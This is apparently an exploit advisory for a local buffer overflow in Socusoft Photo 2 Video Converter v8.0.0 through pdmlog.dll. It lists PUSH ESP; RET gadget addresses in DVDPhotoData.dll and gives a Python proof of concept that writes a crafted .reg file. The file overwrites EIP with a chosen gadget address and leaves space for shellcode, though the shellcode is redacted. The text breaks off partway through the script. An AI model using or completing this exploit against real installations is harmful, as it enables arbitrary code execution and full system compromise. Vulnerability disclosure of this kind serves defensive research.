=================================================================================

[+]----------------------------[ S U M M A R Y ]------------------------------[+]

 Socusoft's Photo 2 Video Converter v8.0.0 (Free and Professional variants) 
 contains a local buffer overflow condition in the pdmlog.dll library. 
 Exploitation can result in x86 register rewrites to control program execution 
 flow, therefore, resulting in ability to execute arbitrary shellcode leading 
 to complete system compromise.
 
[+]-------------------------[ D E S C R I P T I O N ]------------------------[+]

 One of many modules, the following contains no illegal address characters 
 i.e. '\0x00'.
	
  +-----------------------------------------------------------------+
  | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Module           |
  |-----------------------------------------------------------------|
  | False  | False   | False |  False   | False  | DVDPhotoData.dll | 
  +-----------------------------------------------------------------+
	
  The following PUSH ESP, RETN instruction sequence addresses are suitable to 
  redirect program execution:
	
  >_[MODULE: DVDPhotoData.dll]:

	<code>
	0x10002352 push esp; ret
	0x10013945 push esp; retn 0x0004
	0x1004cb83 push esp; retn 0x0008
	0x1004cbb8 push esp; retn 0x0008
	0x1004cc11 push esp; retn 0x0008
	</code>
		
	 
[+]-----------------------[ P R E C O N D I T I O N S ]---------------------[+]
 
 1. Tested on Windows Server 2008 R2
 2. Import generated .reg prior to restarting the executable within a debugger
 3. Overflow condition observed to occur in pdmlog DLL library.
 
 
[+]------------------------[ E X P L O I T A T I O N ]----------------------[+]

 A Proof of Concept is as follows:
 
 >_[Python Script - SHELLCODE REDACTED]:
 
	<code>

	# outfile
	file = "proof-of-concept.reg"
 
	# register re-write
	padding = "\x41" * 548
	eipOffset = "\x45\x39\x01\x10" 	# PUSH ESP (0x10013945)
	stackRewrite = "\x43" * 400 	# Shellcode Space
 
	# generate exploit file containing above payload instructing EIP overwrite

	poc = "Windows Registry Editor Version 5.00\n\n"
	poc = poc + "[HKEY_CURRENT_USER\Software\Socusoft Photo to Video Converter Free Version\General]\n"
	poc = poc + "\"TempFolder\"=\"" + padding + eipOffset + stackRewrite + "\""
 
	try:

		writeFile = open (file, "w")
		writeFile.write( poc )
